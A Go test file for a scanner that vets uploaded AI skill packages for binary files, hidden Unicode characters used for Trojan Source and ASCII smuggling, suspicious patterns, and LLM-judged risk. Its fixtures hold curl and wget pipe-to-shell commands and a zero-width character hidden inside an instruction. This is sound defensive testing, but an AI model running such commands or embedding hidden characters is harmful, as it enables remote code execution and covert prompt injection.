package scan

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/nanoinfraorg/skills-server/internal/pipeline"
)

func files(pairs ...string) []pipeline.FileContent {
	if len(pairs)%2 != 0 {
		panic("files: odd number of arguments")
	}
	var out []pipeline.FileContent
	for i := 0; i < len(pairs); i += 2 {
		out = append(out, pipeline.FileContent{Path: pairs[i], Content: []byte(pairs[i+1])})
	}
	return out
}

func TestRun_CleanFileProducesNoFindings(t *testing.T) {
	report := Run(context.Background(), files("SKILL.md", "---\nname: my-skill\ndescription: does a thing.\n---\n\nBody.\n"), Config{})
	if report.Verdict != VerdictPass {
		t.Errorf("verdict = %s, want pass", report.Verdict)
	}
	if !report.TextOnlyOK {
		t.Errorf("expected TextOnlyOK, got false; failures: %v", report.TextOnlyFailures)
	}
	if len(report.HiddenCharFindings) != 0 {
		t.Errorf("expected no hidden char findings, got %+v", report.HiddenCharFindings)
	}
	if len(report.StaticPatternFindings) != 0 {
		t.Errorf("expected no static pattern findings, got %+v", report.StaticPatternFindings)
	}
}

func TestIsTextOnly_NonUTF8Rejected(t *testing.T) {
	invalidUTF8 := []byte{0xFF, 0xFE, 0x00, 0x01}
	if isTextOnly(invalidUTF8) {
		t.Error("expected invalid UTF-8 to fail the text-only check")
	}
}

func TestIsTextOnly_NULByteRejected(t *testing.T) {
	withNUL := []byte("hello\x00world")
	if isTextOnly(withNUL) {
		t.Error("expected a NUL byte to fail the text-only check")
	}
}

func TestIsTextOnly_ValidTextPasses(t *testing.T) {
	if !isTextOnly([]byte("perfectly ordinary text\nwith newlines\n")) {
		t.Error("expected valid UTF-8 text with no NUL bytes to pass")
	}
}

func TestRun_BinaryDisguisedAsTextFailsTextOnlyCheck(t *testing.T) {
	report := Run(context.Background(), files(
		"SKILL.md", "---\nname: my-skill\ndescription: fine.\n---\n\nBody.\n",
		"scripts/payload.txt", string([]byte{0x00, 0x01, 0x02, 0xFF, 0xFE}),
	), Config{})

	if report.TextOnlyOK {
		t.Error("expected TextOnlyOK to be false")
	}
	if len(report.TextOnlyFailures) != 1 || report.TextOnlyFailures[0] != "scripts/payload.txt" {
		t.Errorf("text only failures = %v, want [scripts/payload.txt]", report.TextOnlyFailures)
	}
	if report.Verdict != VerdictBlocked {
		t.Errorf("verdict = %s, want blocked", report.Verdict)
	}
}

// --- hidden/invisible Unicode character detection, one fixture per class ---

func TestScanHiddenChars_ZeroWidthCharacters(t *testing.T) {
	cases := []struct {
		name string
		r    rune
	}{
		{"ZWSP", '\u200B'},
		{"ZWNJ", '\u200C'},
		{"ZWJ", '\u200D'},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			content := "line one\nsecond " + string(tc.r) + "line\n"
			findings := scanHiddenChars("SKILL.md", []byte(content), false)
			if len(findings) != 1 {
				t.Fatalf("expected 1 finding, got %d: %+v", len(findings), findings)
			}
			f := findings[0]
			if f.File != "SKILL.md" {
				t.Errorf("file = %q, want SKILL.md", f.File)
			}
			if f.Line != 2 {
				t.Errorf("line = %d, want 2", f.Line)
			}
			if f.Rune != string(tc.r) {
				t.Errorf("rune = %q, want %q", f.Rune, string(tc.r))
			}
		})
	}
}

func TestScanHiddenChars_BidiControlCharacters(t *testing.T) {
	// U+202E (RLO) is squarely inside the flagged Trojan Source range.
	content := "safe text\n" + string(rune(0x202E)) + "reordered\n"
	findings := scanHiddenChars("payload.py", []byte(content), false)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(findings), findings)
	}
	if findings[0].Codepoint != "U+202E" {
		t.Errorf("codepoint = %q, want U+202E", findings[0].Codepoint)
	}
	if findings[0].Line != 2 {
		t.Errorf("line = %d, want 2", findings[0].Line)
	}

	// U+2066 (LRI), the second Trojan Source sub-range.
	content2 := string(rune(0x2066)) + "isolated"
	findings2 := scanHiddenChars("other.py", []byte(content2), false)
	if len(findings2) != 1 || findings2[0].Codepoint != "U+2066" {
		t.Errorf("unexpected findings for LRI: %+v", findings2)
	}
}

func TestScanHiddenChars_UnicodeTagsBlock(t *testing.T) {
	// U+E0041 is inside the Unicode Tags block, the ASCII-smuggling range.
	content := "look innocent" + string(rune(0xE0041)) + "\n"
	findings := scanHiddenChars("notes.md", []byte(content), false)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(findings), findings)
	}
	if findings[0].Codepoint != "U+E0041" {
		t.Errorf("codepoint = %q, want U+E0041", findings[0].Codepoint)
	}
}

func TestScanHiddenChars_LeadingBOMOnFirstFileIgnored(t *testing.T) {
	content := "\uFEFF---\nname: my-skill\n---\n"
	findings := scanHiddenChars("SKILL.md", []byte(content), true)
	if len(findings) != 0 {
		t.Errorf("expected leading BOM on the first file to be ignored, got %+v", findings)
	}
}

func TestScanHiddenChars_BOMOnNonFirstFileFlagged(t *testing.T) {
	content := "\uFEFFsome content\n"
	findings := scanHiddenChars("scripts/run.py", []byte(content), false)
	if len(findings) != 1 {
		t.Fatalf("expected a leading BOM on a non-first file to be flagged, got %+v", findings)
	}
	if findings[0].Codepoint != "U+FEFF" {
		t.Errorf("codepoint = %q, want U+FEFF", findings[0].Codepoint)
	}
}

func TestScanHiddenChars_NonLeadingBOMOnFirstFileFlagged(t *testing.T) {
	content := "some content\n\uFEFFmore content\n"
	findings := scanHiddenChars("SKILL.md", []byte(content), true)
	if len(findings) != 1 {
		t.Fatalf("expected a non-leading BOM to be flagged even on the first file, got %+v", findings)
	}
}

func TestRun_HiddenCharFindingBlocksVerdict(t *testing.T) {
	report := Run(context.Background(), files(
		"SKILL.md", "---\nname: my-skill\ndescription: fine.\n---\n\nhidden"+string(rune(0x200B))+"instruction\n",
	), Config{})
	if report.Verdict != VerdictBlocked {
		t.Errorf("verdict = %s, want blocked", report.Verdict)
	}
	if len(report.HiddenCharFindings) != 1 {
		t.Errorf("expected 1 hidden char finding, got %+v", report.HiddenCharFindings)
	}
}

// --- static suspicious pattern checks ---

func TestScanStaticPatterns_CurlPipeToShell(t *testing.T) {
	content := "#!/bin/sh\ncurl https://example.com/install.sh | bash\n"
	findings := scanStaticPatterns("install.sh", []byte(content))
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(findings), findings)
	}
	if findings[0].Pattern != "pipe-to-shell (curl)" {
		t.Errorf("pattern = %q, want pipe-to-shell (curl)", findings[0].Pattern)
	}
	if findings[0].Line != 2 {
		t.Errorf("line = %d, want 2", findings[0].Line)
	}
}

func TestScanStaticPatterns_WgetPipeToShell(t *testing.T) {
	content := "wget -qO- https://example.com/x | sudo sh\n"
	findings := scanStaticPatterns("setup.sh", []byte(content))
	if len(findings) != 1 || findings[0].Pattern != "pipe-to-shell (wget)" {
		t.Fatalf("unexpected findings: %+v", findings)
	}
}

func TestScanStaticPatterns_LongBase64Blob(t *testing.T) {
	blob := strings.Repeat("QWxhZGRpbjpvcGVuIHNlc2FtZQ", 10) // > 200 base64-alphabet chars
	content := "some setup\ndata = \"" + blob + "\"\n"
	findings := scanStaticPatterns("payload.py", []byte(content))
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(findings), findings)
	}
	if findings[0].Pattern != "long base64-like blob" {
		t.Errorf("pattern = %q, want long base64-like blob", findings[0].Pattern)
	}
}

func TestScanStaticPatterns_OrdinaryContentNoFindings(t *testing.T) {
	content := "def main():\n    print('hello world')\n"
	if findings := scanStaticPatterns("main.py", []byte(content)); len(findings) != 0 {
		t.Errorf("expected no findings, got %+v", findings)
	}
}

func TestRun_StaticPatternFindingBlocksVerdict(t *testing.T) {
	report := Run(context.Background(), files(
		"SKILL.md", "---\nname: my-skill\ndescription: fine.\n---\n\nBody.\n",
		"install.sh", "curl https://example.com/x | bash\n",
	), Config{})
	if report.Verdict != VerdictBlocked {
		t.Errorf("verdict = %s, want blocked", report.Verdict)
	}
	if len(report.StaticPatternFindings) != 1 {
		t.Errorf("expected 1 static pattern finding, got %+v", report.StaticPatternFindings)
	}
}

// --- verdict computation: all four combinations of deterministic clean/dirty x LLM absent/suspicious/malicious ---

func TestComputeVerdict_DeterministicCleanNoLLM(t *testing.T) {
	if v := ComputeVerdict(true, nil, nil, nil); v != VerdictPass {
		t.Errorf("verdict = %s, want pass", v)
	}
}

func TestComputeVerdict_DeterministicCleanLLMSafe(t *testing.T) {
	llm := &LLMAssessment{Risk: "safe"}
	if v := ComputeVerdict(true, nil, nil, llm); v != VerdictPass {
		t.Errorf("verdict = %s, want pass", v)
	}
}

func TestComputeVerdict_DeterministicCleanLLMSuspicious(t *testing.T) {
	llm := &LLMAssessment{Risk: "suspicious"}
	if v := ComputeVerdict(true, nil, nil, llm); v != VerdictFlagged {
		t.Errorf("verdict = %s, want flagged", v)
	}
}

func TestComputeVerdict_DeterministicCleanLLMMalicious(t *testing.T) {
	llm := &LLMAssessment{Risk: "malicious"}
	if v := ComputeVerdict(true, nil, nil, llm); v != VerdictFlagged {
		t.Errorf("verdict = %s, want flagged (LLM alone never escalates to blocked)", v)
	}
}

func TestComputeVerdict_DeterministicDirtyNoLLM(t *testing.T) {
	hidden := []HiddenCharFinding{{File: "a", Rune: "x", Codepoint: "U+200B", Line: 1}}
	if v := ComputeVerdict(true, hidden, nil, nil); v != VerdictBlocked {
		t.Errorf("verdict = %s, want blocked", v)
	}
}

func TestComputeVerdict_DeterministicDirtyLLMSuspicious(t *testing.T) {
	static := []StaticPatternFinding{{File: "a", Pattern: "x", Line: 1}}
	llm := &LLMAssessment{Risk: "suspicious"}
	if v := ComputeVerdict(true, nil, static, llm); v != VerdictBlocked {
		t.Errorf("verdict = %s, want blocked (deterministic findings are a hard gate regardless of LLM)", v)
	}
}

func TestComputeVerdict_DeterministicDirtyLLMMalicious(t *testing.T) {
	llm := &LLMAssessment{Risk: "malicious"}
	if v := ComputeVerdict(false, nil, nil, llm); v != VerdictBlocked {
		t.Errorf("verdict = %s, want blocked", v)
	}
}

func TestComputeVerdict_TextOnlyFailureBlocksEvenWithoutOtherFindings(t *testing.T) {
	if v := ComputeVerdict(false, nil, nil, nil); v != VerdictBlocked {
		t.Errorf("verdict = %s, want blocked", v)
	}
}

// --- LLM classification, against an httptest.Server standing in for the provider ---

func TestClassifyWithLLM_ParsesSuccessfulResponse(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer test-key" {
			t.Errorf("missing/incorrect auth header: %q", r.Header.Get("Authorization"))
		}
		var req chatCompletionRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			t.Errorf("decode request: %v", err)
		}
		if req.Model != "test-model" {
			t.Errorf("model = %q, want test-model", req.Model)
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(chatCompletionResponse{
			Choices: []struct {
				Message chatMessage `json:"message"`
			}{
				{Message: chatMessage{Role: "assistant", Content: `{"risk":"suspicious","explanation":"looks like prompt injection"}`}},
			},
		})
	}))
	defer server.Close()

	cfg := Config{LLMAPIBase: server.URL, LLMAPIKey: "test-key", LLMModel: "test-model"}
	assessment := classifyWithLLM(context.Background(), "some skill content", cfg)
	if assessment == nil {
		t.Fatal("expected a non-nil assessment")
	}
	if assessment.Risk != "suspicious" || assessment.Explanation != "looks like prompt injection" {
		t.Errorf("unexpected assessment: %+v", assessment)
	}
}

func TestClassifyWithLLM_UnparseableContentReturnsNil(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(chatCompletionResponse{
			Choices: []struct {
				Message chatMessage `json:"message"`
			}{
				{Message: chatMessage{Role: "assistant", Content: "not json at all"}},
			},
		})
	}))
	defer server.Close()

	cfg := Config{LLMAPIBase: server.URL, LLMAPIKey: "test-key", LLMModel: "test-model"}
	if assessment := classifyWithLLM(context.Background(), "content", cfg); assessment != nil {
		t.Errorf("expected nil assessment for unparseable content, got %+v", assessment)
	}
}

func TestClassifyWithLLM_UnrecognizedRiskValueReturnsNil(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(chatCompletionResponse{
			Choices: []struct {
				Message chatMessage `json:"message"`
			}{
				{Message: chatMessage{Role: "assistant", Content: `{"risk":"unknown","explanation":"?"}`}},
			},
		})
	}))
	defer server.Close()

	cfg := Config{LLMAPIBase: server.URL, LLMAPIKey: "test-key", LLMModel: "test-model"}
	if assessment := classifyWithLLM(context.Background(), "content", cfg); assessment != nil {
		t.Errorf("expected nil assessment for an unrecognized risk value, got %+v", assessment)
	}
}

func TestClassifyWithLLM_NonOKStatusReturnsNil(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer server.Close()

	cfg := Config{LLMAPIBase: server.URL, LLMAPIKey: "test-key", LLMModel: "test-model"}
	if assessment := classifyWithLLM(context.Background(), "content", cfg); assessment != nil {
		t.Errorf("expected nil assessment for a non-200 response, got %+v", assessment)
	}
}

func TestClassifyWithLLM_TruncatesOverlongContent(t *testing.T) {
	var gotContentLen int
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req chatCompletionRequest
		_ = json.NewDecoder(r.Body).Decode(&req)
		gotContentLen = len(req.Messages[len(req.Messages)-1].Content)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(chatCompletionResponse{
			Choices: []struct {
				Message chatMessage `json:"message"`
			}{
				{Message: chatMessage{Content: `{"risk":"safe","explanation":"ok"}`}},
			},
		})
	}))
	defer server.Close()

	cfg := Config{LLMAPIBase: server.URL, LLMAPIKey: "k", LLMModel: "m"}
	overlong := strings.Repeat("x", maxLLMContentChars+1000)
	classifyWithLLM(context.Background(), overlong, cfg)
	if gotContentLen != maxLLMContentChars {
		t.Errorf("sent content length = %d, want %d (truncated)", gotContentLen, maxLLMContentChars)
	}
}

func TestRun_LLMConfiguredAndFlagsSuspiciousContent(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(chatCompletionResponse{
			Choices: []struct {
				Message chatMessage `json:"message"`
			}{
				{Message: chatMessage{Content: `{"risk":"malicious","explanation":"credential harvesting"}`}},
			},
		})
	}))
	defer server.Close()

	cfg := Config{LLMAPIBase: server.URL, LLMAPIKey: "k", LLMModel: "m"}
	report := Run(context.Background(), files("SKILL.md", "---\nname: my-skill\ndescription: fine.\n---\n\nBody.\n"), cfg)
	if report.Verdict != VerdictFlagged {
		t.Errorf("verdict = %s, want flagged", report.Verdict)
	}
	if report.LLMAssessment == nil || report.LLMAssessment.Risk != "malicious" {
		t.Errorf("unexpected llm assessment: %+v", report.LLMAssessment)
	}
}

func TestRun_LLMNotConfiguredSkipsClassification(t *testing.T) {
	report := Run(context.Background(), files("SKILL.md", "---\nname: my-skill\ndescription: fine.\n---\n\nBody.\n"), Config{})
	if report.LLMAssessment != nil {
		t.Errorf("expected no llm assessment when unconfigured, got %+v", report.LLMAssessment)
	}
	if report.Verdict != VerdictPass {
		t.Errorf("verdict = %s, want pass", report.Verdict)
	}
}
